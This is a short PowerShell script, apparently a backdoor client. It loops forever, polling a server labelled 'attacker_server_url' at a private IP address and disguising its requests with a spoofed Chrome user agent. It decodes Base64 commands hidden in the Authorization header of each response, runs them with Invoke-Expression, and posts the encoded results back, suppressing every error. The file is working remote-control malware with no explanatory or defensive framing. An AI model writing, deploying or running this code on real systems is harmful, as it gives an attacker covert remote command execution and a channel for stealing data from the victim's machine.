$attacker_server_url="http://192.168.29.131:80/";
#$proxy="127.0.0.1:8080";
$url =$attacker_server_url;
$postParams = @{result='start'};
while (1 -eq 1)
{
    try
    {
        #$req = Invoke-WebRequest $url  -Proxy $proxy -Method POST -Body $postParams;
        $req = Invoke-WebRequest $url -Method POST -Body $postParams -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36";
        $header = $req.Headers["Authorization"];
        $d = [System.Convert]::FromBase64String($header);
        $Ds = [System.Text.Encoding]::UTF8.GetString($d);
        $result = "";
        Foreach ($string in invoke-expression $Ds)
        {
            $result=$result+'_n1w_'+$string;
        };
        $result = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($result));
        $postParams = @{result=$result};
        $url = $attacker_server_url;
    }catch {};
};

